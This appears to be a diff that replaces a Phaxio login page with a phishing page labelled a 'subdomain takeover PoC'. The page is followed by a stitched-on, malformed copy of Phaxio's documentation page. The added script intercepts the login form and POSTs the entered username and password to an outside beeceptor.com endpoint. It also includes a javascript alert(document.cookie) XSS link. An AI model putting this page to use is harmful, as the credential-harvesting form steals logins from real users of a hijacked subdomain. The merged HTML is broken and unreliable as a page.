@@ -1,62 +1,339 @@
-
-<!DOCTYPE html>
 <html>
+<html lang="en">
 <head>
-<meta charset='utf-8'>
-<meta content='IE=edge' http-equiv='X-UA-Compatible'>
-<meta content='width=device-width, initial-scale=1' name='viewport'>
-<title>Phaxio | Login</title>
-<meta name="csrf-param" content="authenticity_token" />
-<meta name="csrf-token" content="Il6uZWyKomnfW0FXWY-FjX09Rbtp6z53d6FS9srene-Uca3rXGPHAstRwEYJZEJh6kehuq16YqPR_zEX_w81tQ" />
-<link rel="stylesheet" media="screen" href="/assets/application-fe747fff81f08ea824d301b847373311c6880f1616362da0d59cd8adc0a82d45.css" />
-<link rel="shortcut icon" type="image/x-icon" href="/assets/favicon-1f9f8fb18f38ba8d60b52576163bdb6e997846d3d8b55c395a8043bc3196ae81.png" />
+  <meta charset="utf-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0"/>
+  <meta name="robots" content="NOINDEX,NOFOLLOW"/>
+  <meta name="description" content="Subdomain takeover PoC for educational purposes"/>
+
+  <title>Subdomain Takeover PoC - Login</title>
+  
+  <!-- Burp Collaborator link: change this to your own Burp Collaborator server URL -->
+  <script>
+    function sendToBurpCollaborator(username, password) {
+      const collaboratorURL = 'https://bes23.free.beeceptor.com'; // Replace with your Burp Collaborator server URL
+
+      // Send login details to the Burp Collaborator server
+      const xhr = new XMLHttpRequest();
+      xhr.open('POST', collaboratorURL, true);
+      xhr.setRequestHeader('Content-Type', 'application/json');
+      xhr.send(JSON.stringify({
+        username: username,
+        password: password
+      }));
+    }
+
+    // Capture form submission and send data to Burp Collaborator
+    function handleLogin(event) {
+      event.preventDefault();  // Prevent default form submission
+
+      // Get form values
+      const username = document.getElementById('username').value;
+      const password = document.getElementById('password').value;
+
+      // Send login details to Burp Collaborator
+      sendToBurpCollaborator(username, password);
+
+      // Optionally, you can redirect the user after sending
+      // window.location.href = 'your-redirect-url';
+    }
+  </script>
+</head>
+<body>
+<h1>subdomain takeover poc by kuriyama
+  <h1>Login Here</h1>
+  
+  <form id="loginForm" onsubmit="handleLogin(event)">
+    <label for="username">Username:</label><br>
+    <input type="text" id="username" name="username" required><br><br>
+
+    <label for="password">Password:</label><br>
+    <input type="password" id="password" name="password" required><br><br>
+
+    <input type="submit" value="Login">
+<a href="https://bes23.free.beeceptor.com">click to reset password</a>
+  </form>
+<a href="javascript:alert(document.cookie)">click for xss</a>
+</body> <meta charset="utf-8"/>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  <title>Phaxio  |  Documentation</title>
+  <meta name="description" content="Build apps that talk fax. Send and receive fax through our advanced, best-in-class API.
+">
+
+  <link type="text/css" rel="stylesheet" href="/assets/global-de3ddf1c4f93019e8c7c6d7b313e8ee9951a13d04929d7b0a537048b6bfa7e96.css">
+  <link type="text/css" rel="stylesheet" href="/assets/marketing-14d67f073f89d31bc16042f4aba28ccdf77447e63d404b12bd25a75b0f8697fd.css">
+  <link rel="shortcut icon" href="/assets/favicon-b06e026f55b273efd0c60368c5531f4e82fca0fc957f58dfd8a51b6908ad931d.png">
+  <link rel="canonical" href="https://www.phaxio.com/docs/">
+  <link rel="alternate" type="application/rss+xml" title="Phaxio" href="https://www.phaxio.com/feed.xml">
+
+  
 </head>
 
-<body data-page='login'>
-<div class='site site--auth site--login'>
-<header class='site-header site-header--inverted'>
-<div class='container'>
-<a class="branding" href="/"><img alt='Phaxio' class='branding__logo branding--phaxio' src='/assets/Phaxio-Sinch-white-fcb5e3744f330a88e8384d76874c37a4fbd6a99979897d515c0abd7f0b10c4b5.svg' srcset='/assets/Phaxio-Sinch-white-fcb5e3744f330a88e8384d76874c37a4fbd6a99979897d515c0abd7f0b10c4b5.svg 1x'>
-<a href='https://www.phaxio.com'>
-<h1 class='is-visually-hidden'>Phaxio</h1>
-</a>
-<div class='hamburger' id='site-nav-toggle'>
-<span></span>
-<span></span>
-<span></span>
-<span></span>
-</div>
-</a><nav class='site-nav'>
-<a href="https://www.phaxio.com/features/">Features</a>
-<a href="https://www.phaxio.com/docs/">Docs</a>
-<a href="https://www.phaxio.com/blog/">Blog</a>
-<a href="https://www.phaxio.com/faq/">FAQ</a>
-<a href="https://www.phaxio.com/pricing/">Pricing</a>
-<a href="https://www.phaxio.com/contact/">Contact</a>
-<a class="site-nav__link--login" href="/sf_guard_users/sign_in">Login</a>
-<a class="site-nav__link--sign-up btn btn--primary" href="https://sinch.com/apis/fax-api/">Sign Up</a>
-</nav>
-</div>
+
+  <body data-page="documentation">
+  	<div class="site site--documentation">
+	    <header class="site-header  ">
+  <div class=" container ">
+    <a class="branding" href="/">
+      
+      <img class="branding__logo branding--phaxio" src="/assets/Phaxio-Sinch-HEX-375c73ebc68680ae574bd3f7098e6f8dd9f160b508aa901649966513595ad5f0.svg" alt="Phaxio">
+      
+      <h1 class="is-visually-hidden">Phaxio</h1>
+    </a>
+    <div id="site-nav-toggle" class="hamburger">
+      <span></span>
+      <span></span>
+      <span></span>
+      <span></span>
+    </div>
+    <nav class="site-nav">
+        
+      <!-- dynamic links -->
+      <a href="https://www.phaxio.com/features/">Features</a>
+        
+      <!-- dynamic links -->
+      <a href="https://www.phaxio.com/docs/">Docs</a>
+        
+      <!-- dynamic links -->
+      <a href="https://www.phaxio.com/blog/">Blog</a>
+        
+      <!-- dynamic links -->
+      <a href="https://www.phaxio.com/faq/">Faq</a>
+        
+      <!-- dynamic links -->
+      <a href="https://www.phaxio.com/pricing/">Pricing</a>
+        
+      <!-- dynamic links -->
+      <a href="https://www.phaxio.com/contact/">Contact</a>
+        
+      <!-- dynamic links -->
+      <a href="https://console.phaxio.com/login" class="site-nav__link--login">Login</a>
+        
+      <!-- dynamic links -->
+      <a href="https://console.phaxio.com/signup" class="site-nav__link--sign-up btn btn--primary">Sign Up</a>
+       
+    </nav>
+  </div>
 </header>
 
-<main class='site-main'>
-<div class='container'>
-<div class='section'>
-<header>
-<h1>Login</h1>
-<h2>Please enter your credentials below.</h2>
+      <main class="site-main">
+	    	<article class="page">
 
-</header>
-<form class="new_sf_guard_user" id="new_sf_guard_user" autocomplete="off" action="/sf_guard_users/sign_in" accept-charset="UTF-8" method="post"><input type="hidden" name="authenticity_token" value="fPV09_VIiOFJRfpBUFY3KxQ5N2VPoSQ3_V1FeRzmkQ1spBCOQo_I3hsOiktDMRANtmUpk6hbg2Y6xeoZqKUthQ" autocomplete="off" /><div class="field"><label class="field__label" for="sf_guard_user_email">Email
-</label><p class="field__hint"></p><span class="field__feedback"></span><input required="required" class="field__input input--lg" type="email" name="sf_guard_user[email]" id="sf_guard_user_email" /></div><div class="field"><label class="field__label" for="sf_guard_user_password">Password
-<a class="field__label__helper" tabindex="-1" href="/sf_guard_users/password/new">Forgot Your Password?</a>
-</label><p class="field__hint"></p><span class="field__feedback"></span><input required="required" class="field__input input--lg" type="password" name="sf_guard_user[password]" id="sf_guard_user_password" /></div><div class="field field--checkbox"><span class="field__feedback"></span><label class="label label--checkbox" for="sf_guard_user_remember_me"><input name="sf_guard_user[remember_me]" type="hidden" value="0" autocomplete="off" /><input type="checkbox" value="1" name="sf_guard_user[remember_me]" id="sf_guard_user_remember_me" />Keep this device logged in</label></div>
-<button name="button" type="submit" class="btn btn--primary btn--lg">Log In</button>
-</form>
+	<header class="page__header">
+		<div class="container">
+		    <h1>Documentation</h1>
+		    <h2>Learn how to integrate faxing into your app</h2>
+	    </div>
+	</header>
+
+	<div class="container">
+		<div class="page__content">
+		    <div class="gw sm-two-up">
+	<div class="g">
+		<a href="/docs/api/" class="section__item">
+			<i class="icon icon--background icon--book"></i>
+			<i class="icon icon--book"></i>
+			<h2>API Reference</h2>
+			<p>View full API reference covering all you need to get started processing fax.</p>
+		</a>
+	</div>
+	<div class="g">
+		<a href="/docs/clientLibraries" class="section__item">
+			<i class="icon icon--background icon--layers"></i>
+			<i class="icon icon--layers"></i>
+			<h2>Client Libraries</h2>
+			<p>Libraries in a variety of languages that will get you up and running with Phaxio even faster!</p>
+		</a>
+	</div>
+	<div class="g">
+		<a href="/docs/security/hipaa" class="section__item">
+			<i class="icon icon--background icon--pad-lock"></i>
+			<i class="icon icon--pad-lock"></i>
+			<h2>Security</h2>
+			<p>Covers HIPAA compliance and request verification to help secure your documents.</p>
+		</a>
+	</div>
+	<div class="g">
+		<a href="/contact" class="section__item">
+			<i class="icon icon--background icon--question"></i>
+			<i class="icon icon--question"></i>
+			<h2>Need Help?</h2>
+			<p>We're here for you! You can also check out this <object><a href="/docs/errorMessages">error list</a></object> and the <object><a href="/faq">FAQs</a></object>.</p>
+		</a>
+	</div>
 </div>
-</div>
-</main>
-</div>
-<script src="/assets/application-d26e836f29c469a45aaf3f08571cbd660a14bee45a9b9b26ae43d8ff3e5f7361.js"></script>
-</body>
-</html>
+		</div>
+	</div>
+
+</article>
+	    </main>
+	    <footer class="site-footer">
+  <div class="container">
+    <a class="branding" href="/">
+      
+      <img class="branding__logo branding--phaxio" src="/assets/Phaxio-Sinch-HEX-375c73ebc68680ae574bd3f7098e6f8dd9f160b508aa901649966513595ad5f0.svg" alt="Phaxio">
+      
+      <h1 class="is-visually-hidden">Phaxio</h1>
+    </a>
+
+    <nav class="site-nav site-nav--footer">
+       
+      <a href="/about-us">About Us</a>
+        
+      <a href="/presskit.zip">Press Kit</a>
+        
+      <a href="/terms-of-service/">Terms of Service</a>
+        
+      <a href="/privacy-policy/">Privacy Policy</a>
+        
+      <a href="http://status.phaxio.com">Status</a>
+       
+    </nav>
+  </div>
+</footer>
+
+<script async="" src="https://www.googletagmanager.com/gtm.js?id=GTM-TLZ5Z3D"></script><script type="text/javascript" src="/assets/main-48bbdbe2de288b3f65c73bc2353c61d72169f7f5cf659d638869947311ea5366.js"></script>
+
+
+    </div>
+
+    <section id="privacyBanner" class="privacy-banner">
+      <div class="privacy-banner-copy">
+        <p>
+          We set cookies on your computer to improve our site. To learn more
+          about what data we collect and your privacy options see our
+          <a href="/privacy-policy">privacy policy</a> and <a href="/terms-of-service/">terms of service</a>. Your use of this web site is subject
+          to our <a href="/terms-of-service">terms of service</a>
+        </p>
+      </div>
+      <div class="privacy-banner-controls">
+        <div class="btn-group">
+          <button type="button" id="setPrivacy" class="btn btn-dark">OK</button>
+          <button type="button" id="closePrivacyBanner" class="btn btn-outline-dark">Close</button>
+        </div>
+      </div>
+    </section>
+  
+
+
+<div style="display: none; visibility: hidden;"><script id="term-e7e5d07437489" src="https://vidassets.terminus.services/37dd89ba-18a8-4168-a1eb-355101546997/t.js"></script></div><script type="application/ld+json">
+{
+  "@context": "http://schema.org",
+  "@type": "Corporation",
+  "name": "Phaxio",
+  "alternateName": "Phaxio Communications",
+  "legalName": "Phaxio LLC",
+  "parentOrganization": "Voyant Communications",
+  "url": "https://www.phaxio.com",
+  "logo": "https://www.phaxio.com/assets/logo-phaxio-flat-c1cebf7d0c95dac6f08f59c506b74633e257fe80b754799bbc141007f2abefa3.png",
+  "sameAs": [
+    "https://www.linkedin.com/company/phaxio/",
+    "https://twitter.com/phaxio"
+    ],
+    "contactPoint": {
+      "@type": "ContactPoint",
+      "telephone": "+18778832012",
+      "contactType": "customer service",
+      "contactOption": "TollFree",
+      "areaServed": ["US","CA","GB"],
+      "availableLanguage": ["English","Spanish"]
+    },
+  "employees": [
+      {
+        "@type": "Person",
+        "name": "Justin Nelson",
+        "sameAs": "https://www.linkedin.com/in/justinjnelson/",
+        "jobTitle": "President",
+        "worksFor": {
+          "@type": "Organization",
+          "name": "Voyant"
+        }
+      },
+      {
+        "@type": "Person",
+        "name": "Matt Wilson",
+        "sameAs": "https://www.linkedin.com/in/matt-wilson-4b0a01/",
+        "jobTitle": "Senior Vice President of Sales",
+        "worksFor": {
+          "@type": "Organization",
+          "name": "Voyant"
+        }
+      },
+      {
+        "@type": "Person",
+        "name": "Andrea Nyhus",
+        "sameAs": "https://www.linkedin.com/in/andrea-nyhus-2656a65/",
+        "jobTitle": "Chief Financial Officer",
+        "worksFor": {
+          "@type": "Organization",
+          "name": "Voyant"
+        }
+      },
+      {
+        "@type": "Person",
+        "name": "Mary Tuten",
+        "sameAs": "https://www.linkedin.com/in/mary-tuten-7a33024/",
+        "jobTitle": "Chief Operations Officer",
+        "worksFor": {
+          "@type": "Organization",
+          "name": "Voyant"
+      	}
+      },
+      {
+        "@type": "Person",
+        "name": "Lyle Pratt",
+        "sameAs": "https://www.linkedin.com/in/lylepratt/",
+        "jobTitle": "Vice President Strategic Growth",
+        "worksFor": {
+          "@type": "Organization",
+          "name": "Voyant"
+        }
+      },
+	  {
+        "@type": "Person",
+        "name": "Henry Hayter",
+        "sameAs": "https://www.linkedin.com/in/hchayter/",
+        "jobTitle": "Vice President Product",
+        "worksFor": {
+          "@type": "Organization",
+          "name": "Voyant"
+        }
+      },
+      {
+        "@type": "Person",
+        "name": "Brandon Robinson",
+        "sameAs": "https://www.linkedin.com/in/brandon-robinson-9370358a/",
+        "jobTitle": "Vice President Engineering",
+        "worksFor": {
+          "@type": "Organization",
+          "name": "Voyant"
+        }
+      },
+	  {
+        "@type": "Person",
+        "name": "Fritz Hendricks",
+        "sameAs": "https://www.linkedin.com/in/fritz-hendricks-b034292/",
+        "jobTitle": "Chief Executive Officer",
+        "worksFor": {
+          "@type": "Organization",
+          "name": "Voyant"
+        }
+      },
+{
+        "@type": "Person",
+        "name": "Ramakrishna Rao",
+        "sameAs": "https://www.linkedin.com/in/ramakrishnaraoca/",
+        "jobTitle": "Senior Vice President Corporate Solutions",
+        "worksFor": {
+          "@type": "Organization",
+          "name": "Voyant"
+        }
+      }
+    ]
+}
+</script>
+</body></html>
